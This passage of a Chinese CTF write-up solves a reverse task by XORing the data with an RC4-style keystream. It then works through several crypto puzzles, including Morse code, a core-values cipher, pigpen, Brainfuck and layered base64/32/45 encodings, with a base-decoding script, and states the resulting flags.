        KeyStream.append(S[t])

def Get_Decode():
    deres = []
    for i in range(19):
        deres.append(ele[i] ^ KeyStream[i])
    return deres
```

main函数改写成如下

```python
if __name__ == '__main__':
    ele = [84, 91, 254, 48, 129, 210, 135, 132, 112, 234, 208, 15, 213, 39, 108, 253, 86, 118, 248]
    T, S, Key = [], [], []
    PlainText, CryptoText, KeyStream = '', '', []
    text = ""
    init_S()
    init_T()
    swap_S()
    Get_KeyStream()
    deres = Get_Decode()
    print(deres)
```

解释一下为什么要这样改，其实本质上他还是用到了**异或操作**，如果要还原出来，那就让**ele**的每一个字符与**KeyStream**再次异或，很明显的知道**ele**的长度为**19**，那么**flag**的长度也应该是**19**，而**KeyStream**的生成值是固定好的，只是要生成多少的问题，因此就可以这样写出来，得到**flag**的**ascii码**。

![pypy_ascii](https://nssctf.wdf.ink/img/zack/pypy_ascii.jpg)

但是奈何本人水平不够高，确实不知道如何用Python把**int**转成**char**再**转成string**，于是就用cpp写了一下

```c++
#include <iostream>

using namespace std;
int main() {
	char flag[] = { 78, 83, 83, 67, 84, 70, 123, 116, 104, 105, 115, 95, 105, 115, 95, 114, 99, 52, 125 };
	for (int i = 0; i <= 19; i++) { cout << flag[i]; }
}
```

最后结果如下

![pypy_flag](https://nssctf.wdf.ink/img/zack/pypy_flag.jpg)



# CRYPTO

## 1.善哉善哉

首先在图片文件末尾发现了一堆摩斯密码，然後解码...念啥经

![善哉善哉_mosi解码](https://nssctf.wdf.ink/img/zack/shanzaishanzai_mosidecode.jpg)

然后搜到有个玩意叫做...**新约佛论禅**...禅悟佛所言的真谛

![善哉善哉_佛说jpg](https://nssctf.wdf.ink/img/zack/善哉善哉_佛说jpg.jpg)

是不是漏掉什么了呢？回去看看图片-属性，发现还有条线索

![善哉善哉_jpginfo](https://nssctf.wdf.ink/img/zack/shanzaishanzai_jpginfo.jpg)

那就MD5加密

![善哉善哉_flag](https://nssctf.wdf.ink/img/zack/shanzai_flag.jpg)

根据提示755，得到flag

```
NSSCTF{7551772a99379ed0ae6015a470c1e335}
```



## 2.什锦

先看要求

```
CodeA=Decode(友善爱国平等友善自由友善敬业爱国诚信文明诚信自由平等友善平等友善公正诚信民主友善自由友善爱国公正敬业爱国爱国诚信自由友善爱国自由诚信民主爱国诚信民主友善平等友善爱国公正敬业公正爱国法治友善爱国公正敬业爱国爱国诚信自由诚信自由平等敬业文明爱国诚信文明诚信自由爱国诚信民主富强敬业富强)
CodeB=Decode(CodeB.png)
CodeC=Decode(CodeC.txt)
flag=MD5(CodeA+CodeB+CodeC)
```

CodeA查到是**社会主义核心价值观加密解密**

![什锦_a](https://nssctf.wdf.ink/img/zack/什锦_a.jpg)

CodeB为**猪圈密码**,解密如下

![什锦_b](https://nssctf.wdf.ink/img/zack/什锦_b.jpg)

CodeC为...**BrainFuck**（脑*???），解密如下

![什锦_c](https://nssctf.wdf.ink/img/zack/什锦_c.jpg)

所以flag就是

```python
MD5(富强明主和谐pigissocutewhyyoukillpig但是猪猪好好吃诶)
# flag = NSSCTF{5fcaf5cb66da56d692f2d6821d450ee4}
```

(因为写本WriteUp时，平台已关闭答题，不太确定猪圈密码到底是大写还是小写，此处暂且认为是小写。)



##  3.All in Base

（我永远喜欢WDLJT）

知乎上搜到一片关于base全家桶的py脚本，非常好用。但是很遗憾，这里有个巨坑，我们等会说。

[base家族&全家桶 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/454458711)

但是有一部分在我的环境下跑不动，于是我修改了一下

```python
#encoding=utf-8
import base36
import base58
import base64
import base91
import base45
import base128

'''
txt=b"123456"

b128 = base128.base128(chars = None, chunksize = 7)  
base128_encode=list(b128.encode(txt))
base128_decode=b''.join(b128.decode(base128_encode))
print(base128_decode)
'''

def encode(txt):
    print("[+]input is ", end="")
    print(txt)

    print("==============================================================================")
    #base16
    print("[成功]base16 encode: ", end="")
    print(base64.b16encode(txt))

    #base32
    print("[成功]base32 encode: ", end="")
    print(base64.b32encode(txt))


    #base36
    try:
        base36_m_str = bytes.decode(txt)
        base36_m_int = int(base36_m_str)

        base36_cipher = base36.dumps(base36_m_int)
        print("[成功]base36 encode: ", end="")
        print(base36_cipher)
    except Exception as e:
        print("[失败]base36 encode: ", end="")
        print("base36加密只支持整数数字")
    
    #base58
    print("[成功]base58 encode: ", end="")
    print(base58.b58encode(txt))

    #base64
    print("[成功]base64 encode: ", end="")
    print(base64.b64encode(txt))

    #base85
    print("[成功]base85 encode: ", end="")
    print(base64.b85encode(txt))

    #base91
    print("[成功]base91 encode: ", end="")
    print(base91.encode(txt))

    base128
    b128 = base128.base128(chars = None, chunksize = 7)
    print("[成功]base128 encode: ", end="")
    print(list(b128.encode(txt)))


def decode(txt):
    print("[+]input is ", end="")
    print(txt)
    print("==============================================================================")
    
    #base16
    try:
        base16_decode = base64.b16decode(txt)
        print("[成功]base16 decode: ", end="")
        print(base16_decode)
        print()
    except Exception as e:
        print("[失败]base16 decode: ", end="")
        print(e)


    #base32
    try:
        base32_decode = base64.b32decode(txt)
        print("[成功]base32 decode: ", end="")
        print(base32_decode)
        print()
    except Exception as e:
        print("[失败]base32 decode: ", end="")
        print(e)


    #base36
    try:
        base36_decode = base36.loads(txt)
        print("[成功]base36 decode: ", end="")
        print(base36_decode)
        print()
    except Exception as e:
        print("[失败]base36 decode: ", end="")
        print(e)

    #base45
    try:
        base45_decode = base45.b45decode(txt)
        print("[成功]base45 decode: ", end="")
        print(base45_decode)
        print()
    except Exception as e:
        print("[失败]base45 decode: ", end="")
        print(e)
        
    #base58
    try:
        base58_decode = base58.b58decode(txt)
        print("[成功]base58 decode: ", end="")
        print(base58_decode)
        print()
    except Exception as e:
        print("[失败]base58 decode: ", end="")
        print(e)

    #base64
    try:
        base64_decode = base64.b64decode(txt)
        print("[成功]base64 decode: ", end="")
        print(base64_decode)
        print()
    except Exception as e:
        print("[失败]base64 decode: ", end="")
        print(e)


    #base85
    try:
        base85_decode = base64.a85decode(txt).decode()
        print("[成功]base85 decode: ", end="")
        print(base85_decode)
        print()
    except Exception as e:
        print("[失败]base85 decode: ", end="")
        print(e)


    #base91
    try:
        base91_decode = base91.decode(str(txt, encoding="utf-8")).decode()
        print("[成功]base91 decode: ", end="")
        print(base91_decode)
        print()
    except Exception as e:
        print("[失败]base91 decode: ", end="")
        print(e)

    base128
    try:
        b128 = base128.base128(chars = None, chunksize = 7)
        print(type(txt))
        txt=list(bytes(txt))#byte转list
        print(type(txt))
        base128_decode = b''.join(b128.decode(txt))
        print("[成功]base128 decode: ", end="")
        print(base128_decode)
        print()
    except Exception as e:
        print("[-]base128 decode: ", end="")
        print(e)
    



if __name__ == '__main__':
    print("Welcome to base series encode and decode")
    txt = input("Please input your string ::: ")


    txt = str.encode(txt)
    flag = input("Please input encode(1) or decode(回车) ::: ")

    if(flag == "1"):
        encode(txt)
    else:
        decode(txt)
```

请注意，这里多加了一个**base45**，但是我相信正常绝大多数人都想不到出题人到底是什么脑回路能找到这么冷门的base编码！而且仅Python独有！！！

我当初一度放弃，甚至想与CTF就此别过，是学姐学长们不断鼓励我才终于坚持下来。（当事人表示非常抱歉）

![wdljt笑](https://nssctf.wdf.ink/img/zack/wdljtlaugh.jpg)



首先是base64解码得到base16的编码

```
4b4244444d57434c49564955555243564b4242544b4c324549464d544d57525749495a464d515a59484643465554525945513355494e525647354246514e53494b5241534b53534449455a554954434b494951453651324e4a4e4354554d32474a56434549564348484244454b524b4c49453354554a4346484a4a445152534c495646464f524b4f4a354153344d53454a4e47544d5642514846475453524b44494e41564b5543464a3542444f4f5245495649534152434f464d3445594f4b474a424e45434e4b4b4945564334524b554c413445574d4b43465953544d52534d47595653554f434749564354454e32424c495a554b564258494532444f515252455243444f564b444b464d545352434d495a485334524b54474e434645544a57484a42444f56534b49513546514f4352474e4343345742574a515954534b52594955334447525354493434444b4c53444b564b45434d5245494e4553554f43324945335443574a59495134454952434549464553325132464a4e434332514a59484a48554951534948413244535243554a354155494e5258455532545357534a494d5a454d524b55464d3455515332464a424c554b56534d495a4646514e53574b5642534b514a584b4a4844514c534c495a4d46534f4a564a413446454f5257494642444f4c5245495534455752534a4b564256434b5a5a4b415a45454f4b4a494a4653345132464a3434564553534346555a554d545346494e44454352534949493346514b52574b4d58454757434c495132554f4e5346475a415645534b434b4e4b445357535448424455344f43514a4a424532555a59474932454b4d433248455345344f4252495241544d554b454b354355494e425748464d55454e32594a553446474d53434a413344534c535548455a43365242454b5642564357525a474646554b545a5147354d5534514b4b4949335553524b464b5645445356325049464c434152435045524344414c32464a4134554b535350494e4b55555153594a4e44454349434249354845435653484842445447524b454759345441535344474933554356535149555754435153534c493453325253474a4933554352425949564945454f434748493344434a4344464a494549525250495242534952434b4c413344434943444a4249554b564b4f484133564b514b4849564354514f43454752455543535a4e48464c4641524b4245564355345132424a564d545153524e4946415453525255464d3443554b5a59495243554b55324649564d54475253454b564154534b5a5948424d544d544253494a4c4643524a464a553344414c5344474a4e44534d5241494e4a53495242594a4a415349555a5a4b555654534e425349513444475253554a4642554d4d324545564255454f4357494d345555514b53454243464b55525748415145435343324945344555514b55463543554b574a5a4b4644454d575250495532454d524b554a4a435532574a59475a47454b4e3257494e4d544d4f4a58493433444f4c3246454153544d564b4c49515a5447524a5747524445364d32474956454451545a4f49553345474f42454b493345434b5a594b524554534f4a4549555655324f4a514759335355543242455556444d534b55484134454f4e534f4a413454495253464952425451534b4d4759354549515a544741345549555a5747464a444d52425049564b53554f4354495644454b5253474c464c544d514b4d475a4445454f434f4a4a42464757525a494557545353535749564b4551514b49474a424455574259495a44454d4e525449553354495253474a4a4244494d4a5a4b5532454d525a5349495a564f524b4f4949344553544a57475556545153433248464a454b5253474a4e4356535453424a555145475653524956475336524355493434454957525a4b495955454c4a51484556444d4f4a324656434341544257455134554d4c3242475a4b5332514b464a5133444f4f43434b455a5549574a414955514655513250465a4254435742574a5643454355435549455946534e5257465a4255574c4a5a4a343445494f4a59494a454547514b4a4a593443575332464b455845494c4b44494d5645344f424e474642453453324548415345474b535549464a564d524b5a454242544b4e525848453445454a4a5749495a5549514b43475934533456425a4934514547525a414951354349524a454a464243494d4b434b464244514b32554845354547514a4b494534454f56434245415755474d4a4e494645454352534f475533564754534246595845494e324f4841534334524a4c474134564b5243434541514549535348475a485643524b5a454242554b564259474d3344534d5257473549555752424c494534444952534748464d54514c3249484534544d514b45474e4356555353464635455547523255484643455752534f464e41544f534b43474551454754434649595654414f4a4547464246434e53424c464844514d5348475a4245594e53474a513345434b5a5a4a524b445156324b494d51444552434e474134544f534a5a47564855434e534a49464d45594e53324741345336525347465533554956535149524b46415242514a4e425341524b474a4d58454b5543474959565536515a414a4e43545354525a4b4a424451535255495a444549514a53495a434355574a594b3435444d574345494e45464352434e464e41534956534647464254514b535549464d55514f434648464343324e53424b4559444f51525a49524e45495153574c4a4253364e3243494a4345454e5250495648564d5132504a593453325432454b42435549554a5647345955435252554c453443324d5346475a435549564a53495158454b5243554b4d3445345432424a4247444d4f4a4e48464245534f4a4b47354245574a4a574a49344549574b43484244453651324d48493344534a43464b595145495742464759344555515245484243554d5653444756465547513257494d34454f4e534d48464355364c53464b49334543544b4f48424346554f4a464a354345475353434949345549514b4b494a4643554f434f494e4155574c4a5a49515345494f4b5a48453543415243524959334449554b46474a4445494c4b4549524c56534f4a504a4a4254495152574a424c554b4e4252494a48564b515a544552425643544a574845345549535a5a495646544351524c464d344334524b474a354a54514b524c48424a534952425a474a434453555a574a464c45474d434d49555a44414f4b5147453454415332464c4a42444f4c5347475a42454d5252524a4e4255325653464b595845474c4a414951344555514b5249524345434a4b46464a475451524b4549495845365132554945334645574a5a4745585549544b45494d51464d524b5a49524256414b5a594a5a4945474c4b5049524a45535132584c4a4156494a4a574b4644454d5532554845354547514a504a513345554d425846495145474a4348475a4a54475253504b4933434b4c324647424355474c53454952494334524a574a464244494d4a5a464953544d4c5257484551444b4e5a464a4134554b534a5a4a464b5547525346495648445152424e49453354494e3242475244454d494241495157554d4e524f4c4a4153554e32454a4e4945494e4a454956475336524b5347453456474f4b47494a4b55434c324b49524d45594e53474b4d3345515332454649564453544b5a48424e44475253594a46424547554345474e4345474d5a5049524c56474f424c494a415651524b464b5647454d4e425949495755454e32474b4d3346514b525946564245434d524e49464246554f4258494933544b494342465643554d555245495156444f52434b4b354355475243444b354b454353434348424c56534f42594b35435341524b464a5245554554435749553543345132504735424653514a574b5244444d52525248464b45534f4a504a464154554c5a5747354b445154435149564d5447524b594542425655564b444c46424451514b4b4951354557525254494e4154454a434648415845474f4a52484642434b524b4f4949335334514a574b464545434e4b51494e475357514b47465a434651544a57484a46454956524f494e4a55324f43464735415355574a594955575453515253494a445332515a464c41334649565346494e4854534e4356494d3346534e52594741335532515a594b5244444d5153324842484334524232454243444b4e43464a59595545524b554846464341515a574a413445534d4b434a4153544d52434c49595754475252594c493445594f52574a424e4453524b42495a49564d5132464949334336535344495158554b524b54484135434b4e52534b493344414f53464742485453543254484247444d4f4a574c4a415443524b4647354e45434f525a49595755454e5a46454242554d5332454b415654534c324f494641533652424c49564443364c4b454b524c544d4a4258495242464f524a554a4e42554d5332464b52484451533250494559455551524e45424345454a434549354355474e4b5a475a4643365243514b4643565154434747354254514e3232484132444d4f4a32493434444d534a5947464a544d555343484242564d5132424c49344449554b464c45575547545a57484553433451325a47354345535432424b4958554b555a5349493545434f434c4b5241554b4a4346475a4b55474e5a4649564c44554e53494b424344554e53424659565453564b4a49453354414f4b424a3434554d543244475a4345454a434e48415144414f4a414849334449515258455558454749435049455953554e52324a4a425532524b464a5649454b55535a4846495643524b504b4d33434b514a5849343455495553444945344643524359465a43455355434545424d444d4b534d4759345553515343465a4346414d324549595a55494e42464955595547514a5a4c413344515443464c4553544d534a45495645544f515357465a4254535353444b415a45494b524e49464c4451524a4149524243345432444c4642444f5532434841345553514a5949493345534e32434b564844535532324846465534514b524a59344455525257494a4e45434d433248424d56534f4b5949343445594e324249354645455643554945584447524a5747593356474d534647415a554b4c4a4b48424344495253584a5533454b534259495645545356325a484133464352424b465642534b54324246593344534c4a5749464a544d514b4e474134533253425a4a495a45494d5a5147354255454f435a48424355434c3246494645554553435649453445435252324945344355554344473432454b524257473453454f4e534a4b56425334544a5a463433554551534b494933454b5243584842435545544346475a45444d574250495556445352525a4a4e42534b56425a4b354b4453574b4b494d5645434f4355464933433454525a46495145474f435a48415945474f425249524255514d534346354345454a4345494a4545514f42414a59344443515a594a42464547525a5849455955364f4a52455243464f4b5a5a4b424d5453564b50494e4d434152434b464e415449514b474a4e48445155424549564c454b5242464c4534444f563246484a47545156434348424355435252544c49344349574a5a465934454d4e534a4845535334515a45475a424553564b4447495a4549575245495249464d513259455243465553425947424645454c5332494642444d514a514b4d33444f4a4b464a3544444d4942574949325641515a56474a4243414c324648464d54514f535a4845345349515a4e4b42434555534b4245424d44514a435049464743345132524b5642554f5353434934564451513244484242444f4f4a4b48464355434e4347474247544d4b524c484244554d524b58465a4256474b5a5a47354d544d4c4b4749595a564d524b52473541544d4e3243495242445153534b494d58544d514b46473541544f535345495934554d525345494e4155555242524956424543533244475249554b554a5647343443574f4b4745524343344d5346464e4754534e4b4d49555946494f434c474e44464f534b444b4d5a454b4e4b56494e4e43345132434b42434655565a574c4559445356434a48464c56514f4351474e4446455643424b5249554b544b56494e45464d524a554a41334551515a594a524554534f4b4b494a49454b524b5349524254495552574a354645454f434d4955584349524b52464d3453325432444b4951454951324a494a4c5555524b574a4a43554d51525746354355494b325548455344455243524a4a43444156425a4a464e45434e4350484648454b52434c495642564751525849564845434b534a4949334549515358475133554b534b42455556545152524549515755594e53514c49345349555a5949354345474d4343473542554d524b5845424354454e5a5a4b4559444f4e435448424b45344f4b4b4a4e4353324d425a47424554514b5a53495249454d524b494b4d3446515243444b464255454d434d495559454f4e52584a464245554c4b424a51584547574b54484243544752434a46553455574b52574b4d5845474e4b4b495134444f51524c494933554d4a4a574a524855474f534247595a4559524b544a4534544d564b444b4e4c554b494359475933555551525548464345434c4b424935454451574b57495559534952425a4a5244454b565344475551454753524c49455654554e534e464e4153574a4a574b4159513d3d3d3d
```

再解码得到base32的编码

```
KBDDMWCLIVIUURCVKBBTKL2EIFMTMWRWIIZFMQZYHFCFUTRYEQ3UINRVG5BFQNSIKRASKSSDIEZUITCKIIQE6Q2NJNCTUM2GJVCEIVCHHBDEKRKLIE3TUJCFHJJDQRSLIVFFORKOJ5AS4MSEJNGTMVBQHFGTSRKDINAVKUCFJ5BDOOREIVISARCOFM4EYOKGJBNECNKKIEVC4RKULA4EWMKCFYSTMRSMGYVSUOCGIVCTEN2BLIZUKVBXIE2DOQRRERCDOVKDKFMTSRCMIZHS4RKTGNCFETJWHJBDOVSKIQ5FQOCRGNCC4WBWJQYTSKRYIU3DGRSTI44DKLSDKVKECMREINESUOC2IE3TCWJYIQ4EIRCEIFES2Q2FJNCC2QJYHJHUIQSIHA2DSRCUJ5AUINRXEU2TSWSJIMZEMRKUFM4UQS2FJBLUKVSMIZFFQNSWKVBSKQJXKJHDQLSLIZMFSOJVJA4FEORWIFBDOLREIU4EWRSJKVBVCKZZKAZEEOKJIJFS4Q2FJ44VESSCFUZUMTSFINDECRSIII3FQKRWKMXEGWCLIQ2UONSFGZAVESKCKNKDSWSTHBDU4OCQJJBE2UZYGI2EKMC2HESE4OBRIRATMUKEK5CUINBWHFMUEN2YJU4FGMSCJA3DSLSUHEZC6RBEKVBVCWRZGFFUKTZQG5MU4QKKII3USRKFKVEDSV2PIFLCARCPERCDAL2FJA4UKSSPINKUUQSYJNDECICBI5HECVSHHBDTGRKEGY4TASSDGI3UCVSQIUWTCQSSLI4S2RSGJI3UCRBYIVIEEOCGHI3DCJCDFJIEIRRPIRBSIRCKLA3DCICDJBIUKVKOHA3VKQKHIVCTQOCEGREUCSZNHFLFARKBEVCU4Q2BJVMTQSRNIFATSRRUFM4CUKZYIRCUKU2FIVMTGRSEKVATSKZYHBMTMTBSIJLFCRJFJU3DALSDGJNDSMRAINJSIRBYJJASIUZZKUVTSNBSIQ4DGRSUJFBUMM2EEVBUEOCWIM4UUQKSEBCFKURWHAQECSC2IE4EUQKUF5CUKWJZKFDEMWRPIU2EMRKUJJCU2WJYGZGEKN2WINMTMOJXI43DOL2FEASTMVKLIQZTGRJWGRDE6M2GIVEDQTZOIU3EGOBEKI3ECKZYKRETSOJEIUVU2OJQGY3SUT2BEUVDMSKUHA4EONSOJA4TIRSFIRBTQSKMGY5EIQZTGA4UIUZWGFJDMRBPIVKSUOCTIVDEKRSGLFLTMQKMGZDEEOCOJJBFGWRZIEWTSSSWIVKEQQKIGJBDUWBYIZDEMNRTIU3TIRSGJJBDIMJZKU2EMRZSIIZVORKOII4ESTJWGUVTQSC2HFJEKRSGJNCVSTSBJUQEGVSRIVGS6RCUI44EIWRZKIYUELJQHEVDMOJ2FVCCATBWEQ4UML2BGZKS2QKFJQ3DOOCCKEZUIWJAIUQFUQ2PFZBTCWBWJVCECUCUIEYFSNRWFZBUWLJZJ44EIOJYIJEEGQKJJY4CWS2FKEXEILKDIMVE4OBNGFBE4S2EHASEGKSUIFJVMRKZEBBTKNRXHE4EEJJWIIZUIQKCGY4S4VBZI4QEGRZAIQ5CIRJEJFBCIMKCKFBDQK2UHE5EGQJKIE4EOVCBEAWUGMJNIFEECRSOGU3VGTSBFYXEIN2OHASC4RJLGA4VKRCCEAQEISSHGZHVCRKZEBBUKVBYGM3DSMRWG5IUWRBLIE4DIRSGHFMTQL2IHE4TMQKEGNCVUSSFF5EUGR2UHFCEWRSOFNATOSKCGEQEGTCFIYVTAOJEGFBFCNSBLFHDQMSHGZBEYNSGJQ3ECKZZJRKDQV2KIMQDERCNGA4TOSJZGVHUCNSJIFMEYNS2GA4S6RSGFU3UIVSQIRKFARBQJNBSARKGJMXEKUCGIYVU6QZAJNCTSTRZKJBDQSRUIZDEIQJSIZCCUWJYK45DMWCEINEFCRCNFNASIVSFGFBTQKSUIFMUQOCFHFCC2NSBKEYDOQRZIRNEIQSWLJBS6N2CIJCEENRPIVHVMQ2PJY4S2T2EKBCUIUJVG4YUCRRULE4C2MSFGZCUIVJSIQXEKRCUKM4E4T2BJBGDMOJNHFBESOJKG5BEWJJWJI4EIWKCHBDE6Q2MHI3DSJCFKYQEIWBFGY4EUQREHBCUMVSDGVFUGQ2WIM4EONSMHFCU6LSFKI3ECTKOHBCFUOJFJ5CEGSSCII4UIQKKIJFCUOCOINAUWLJZIQSEIOKZHE5CARCRIY3DIUKFGJDEILKEIRLVSOJPJJBTIQRWJBLUKNBRIJHVKQZTERBVCTJWHE4UISZZIVFTCQRLFM4C4RKGJ5JTQKRLHBJSIRBZGJCDSUZWJFLEGMCMIUZDAOKQGE4TAS2FLJBDOLSGGZBEMRRRJNBU2VSFKYXEGLJAIQ4EUQKRIRCECJKFFJGTQRKEIIXE6Q2UIE3FEWJZGEXUITKEIMQFMRKZIRBVAKZYJZIEGLKPIRJESQ2XLJAVIJJWKFDEMU2UHE5EGQJPJQ3EUMBXFIQEGJCHGZJTGRSPKI3CKL2FGBCUGLSEIRIC4RJWJFBDIMJZFISTMLRWHEQDKNZFJA4UKSJZJFKUGRSFIVHDQRBNIE3TIN2BGRDEMIBAIQWUMNROLJASUN2EJNIEINJEIVGS6RKSGE4VGOKGIJKUCL2KIRMEYNSGKM3EQS2EFIVDSTKZHBNDGRSYJFBEGUCEGNCEGMZPIRLVGOBLIJAVQRKFKVGEMNBYIIWUEN2GKM3FQKRYFVBECMRNIFBFUOBXII3TKICBFVCUMUREIQVDORCKK5CUGRCDK5KECSCCHBLVSOBYK5CSARKFJREUETCWIU5C4Q2PG5BFSQJWKRDDMRRRHFKESOJPJFATULZWG5KDQTCQIVMTGRKYEBBVUVKDLFBDQQKKIQ5EWRRTINATEJCFHAXEGOJRHFBCKRKOII3S4QJWKFEECNKQINGSWQKGFZCFQTJWHJFEIVROINJU2OCFG5ASUWJYIUWTSQRSIJDS2QZFLA3FIVSFINHTSNCVIM3FSNRYGA3U2QZYKRDDMQS2HBHC4RB2EBCDKNCFJYYUERKUHFFCAQZWJA4ESMKCJASTMRCLIYWTGRRYLI4EYORWJBNDSRKBIZIVMQ2FII3C6SSDIQXUKRKTHA5CKNRSKI3DAOSFGBHTST2THBGDMOJWLJATCRKFG5NECORZIYWUENZFEBBUMS2EKAVTSL2OIFAS6RBLIVDC6LKEKRLTMJBXIRBFORJUJNBUMS2FKRHDQS2PIEYEUQRNEBCEEJCEI5CUGNKZGZFC6RCQKFCVQTCGG5BTQN22HA2DMOJ2I44DMSJYGFJTMUSCHBBVMQ2BLI4DIUKFLEWUGTZWHESC4Q2ZG5CEST2BKIXUKUZSII5ECOCLKRAUKJCFGZKUGNZFIVLDUNSIKBCDUNSBFYVTSVKJIE3TAOKBJ44UMT2DGZCEEJCNHAQDAOJAHI3DIQRXEUXEGICPIEYSUNR2JJBU2RKFJVIEKUSZHFIVCRKPKM3CKQJXI44UIUSDIE4FCRCYFZCESUCEEBMDMKSMGY4USQSCFZCFAM2EIYZUINBFIUYUGQJZLA3DQTCFLESTMSJEIVETOQSWFZBTSSSDKAZEIKRNIFLDQRJAIRBC4T2DLFBDOU2CHA4USQJYII3ESN2CKVHDSU22HFFU4QKRJY4DURRWIJNECMC2HBMVSOKYI44EYN2BI5FEEVCUIEXDGRJWGY3VGMSFGAZUKLJKHBCDIRSXJU3EKSBYIVETSV2ZHA3FCRBKFVBSKT2BFY3DSLJWIFJTMQKNGA4S2SBZJIZEIMZQG5BUEOCZHBCUCL2FIFEUESCVIE4ECRR2IE4CUUCDG42EKRBWG4SEONSJKVBS4TJZF43UEQSKII3EKRCXHBCUETCFGZEDMWBPIUVDSRRZJNBSKVBZK5KDSWKKIMVECOCUFI3C4TRZFIQEGOCZHAYEGOBRIRBUQMSCF5CEEJCEIJEEQOBAJY4DCQZYJBFEGRZXIEYU6OJRERCFOKZZKBMTSVKPINMCARCKFNATIQKGJNHDQUBEIVLEKRBFLE4DOV2FHJGTQVCCHBCUCRRTLI4CIWJZFY4EMNSJHESS4QZEGZBESVKDGIZEIWREIRIFMQ2YERCFUSBYGBFEELS2IFBDMQJQKM3DOJKFJ5DDMIBWII2VAQZVGJBCAL2FHFMTQOSZHE4SIQZNKBCEUSKBEBMDQJCPIFGC4Q2RKVBUOSSCI4VDQQ2DHBBDOOJKHFCUCNCGGBGTMKRLHBDUMRKXFZBVGKZZG5MTMLKGIYZVMRKRG5ATMN2CIRBDQSSKIMXTMQKFG5ATOSSEIY4UMRSEINAUURBRIVBECS2DGRIUKUJVG44CWOKGERCC4MSFFNGTSNKMIUYFIOCLGNDFOSKDKMZEKNKVINNC4Q2CKBCFUVZWLEYDSVCJHFLVQOCQGNDFEVCBKRIUKTKVINEFMRJUJA3EQQZYJRETSOKKIJIEKRKSIRBTIURWJ5FEEOCMIUXCIRKRFM4S2T2DKIQEIQ2JIJLUURKWJJCUMQRWF5CUIK2UHESDERCRJJCDAVBZJFNECNCPHFHEKRCLIVBVGQRXIVHECKSJII3EIQSXGQ3UKSKBEUVTQRREIQWUYNSQLI4SIUZYI5CEGMCCG5BUMRKXEBCTENZZKEYDONCTHBKE4OKKJNCS2MBZGBETQKZSIRIEMRKIKM4FQRCDKFBUEMCMIUYEONRXJFBEULKBJQXEGWKTHBCTGRCJFU4UWKRWKMXEGNKKIQ4DOQRLII3UMJJWJRHUGOSBGYZEYRKTJE4TMVKDKNLUKICYGY3UUQRUHFCECLKBI5EDQWKWIUYSIRBZJRDEKVSDGUQEGSRLIEVTUNSNFNASWJJWKAYQ====
```

再再解码就是base45的编码了

```
PF6XKEQJDUPC5/DAY6Z6B2VC89DZN8$7D657BX6HTA%JCA3DLJB OCMKE:3FMDDTG8FEEKA7:$E:R8FKEJWENOA.2DKM6T09M9ECCAUPEOB7:$EQ DN+8L9FHZA5JA*.ETX8K1B.%6FL6+*8FEE27AZ3ET7A47B1$D7UCQY9DLFO.ES3DRM6:B7VJD:X8Q3D.X6L19*8E63FSG85.CUTA2$CI*8ZA71Y8D8DDDAI-CEKD-A8:ODBH849DTOAD67%59ZIC2FET+9HKEHWEVLFJX6VUC%A7RN8.KFXY95H8R:6AB7.$E8KFIUCQ+9P2B9IBK.CEO9RJB-3FNECFAFHB6X*6S.CXKD5G6E6ARIBST9ZS8GN8PJBMS824E0Z9$N81DA6QDWED469YB7XM8S2BH69.T92/D$UCQZ91KEO07YNAJB7IEEUH9WOAV DO$D0/EH9EJOCUJBXKFA AGNAVG8G3ED690JC27AVPE-1BRZ9-FFJ7AD8EPB8F:61$C*PDF/DC$DJX61 CHQEUN87UAGEE88D4IAK-9VPEA%ENCAMY8J-AA9F4+8*+8DEESEEY3FDUA9+88Y6L2BVQE%M60.C2Z92 CS$D8JA$S9U+942D83FTICF3D%CB8VC9JAR DUR68 AHZA8JAT/EEY9QFFZ/E4FETJEMY86LE7VCY697G67/E %6UKD33E64FO3FEH8O.E6C8$R6A+8TI99$E+M9067*OA%*6IT88G6NH94FEDC8IL6:DC309DS61R6D/EU*8SEFEFFYW6AL6FB8NJBSZ9A-9JVETHAH2B:X8FFF63E74FFJB419U4FG2B3WENB8IM65+8HZ9REFFKEYNAM CVQEM/DTG8DZ9R1B-09*69:-D L6$9F/A6U-AEL678BQ3DY E ZCO.C1X6MDAPTA0Y66.CK-9O8D98BHCAIN8+KEQ.D-CC*N8-1BNKD8$C*TASVEY C56798B%6B3DAB69.T9G CG D:$E$IB$1BQB8+T9:CA*A8GTA -C1-AHAFN57SNA..D7N8$.E+09UDB  DJG6OQEY CET8369267QKD+A84FF9Y8/H996AD3EZJE/ICGT9DKFN+A7IB1 CLEF+09$1BQ6AYN82G6BL6FL6A+9LT8WJC 2DM097I95OA6IAXL6Z09/FF-7DVPDTPD0KC EFK.EPFF+OC KE9N9RB8J4FFDA2FD*Y8W:6XDCHQDM+A$VE1C8*TAYH8E9D-6AQ07B9DZDBVZC/7BBDB6/EOVCON9-ODPEDQ571AF4Y8-2E6EDU2D.EDTS8NOAHL69-9BI9*7BK%6J8DYB8FOCL:69$EV DX%68JB$8EFVC5KCCVC8G6L9EO.ER6AMN8DZ9%ODCJBB9DAJBJ*8NCAK-9D$D9Y9: DQF64QE2FD-DDWY9/JC4B6HWE41BOUC3$CQM699DK9EK1B++8.EFOS8*+8S$D92D9S6IVC0LE209P190KEZB7.F6BFF1KCMVEV.C- D8JAQDDA%E*M8EDB.OCTA6RY91/DMDC VEYDCP+8NPC-ODRICWZAT%6QFFST9:CA/L6J07* C$G6S3FOR6%/E0EC.DDP.E6IB419*%6.69 57%H9EI9IUCFEEN8D-A747A4FF  D-F6.ZA*7DKPD5$EM/ER19S9FBUA/JDXL6FS6HKD**9MY8Z3FXIBCPD3DC3/DWS8+BAXEEULF48B-B7FS6X*8-BA2-ABZ87B75 A-EFR$D*7DJWECDCWTAHB8WY88WE EELIBLVE:.CO7BYA6TF6F19TI9/IA:/67T8LPEY3EX CZUCYB8AJD:KF3CA2$E8.C919B%ENB7.A6QHA5PCM+AF.DXM6:JDV.CSM8E7A*Y8E-9B2BG-C%X6TVECO94UC6Y6807MC8TF6BZ8N.D: D54EN1BET9J C6H8I1BH%6DKF-3F8Z8L:6HZ9EAFQVCEB6/JCD/EES8:%62R60:E0O9OS8L696ZA1EE7ZA:9F-B7% CFKDP+9/NAA/D+EF/-DTW6$7DBWE4KCFKETN8KOA0JB- DB$DGEC5Y6J/DPQEXLF7C87Z8469:G86I81S6RB8CVCAZ84QEY-CO69$.CY7DIOAR/ES2B:A8KTAE$E6UC7%EV:6HPD:6A.+9UIA709AO9FOC6DB$M8 09 :64B7%.C OA1*6:JCMEEMPERY9QQEOS6%A7G9DRCA8QDX.DIPD 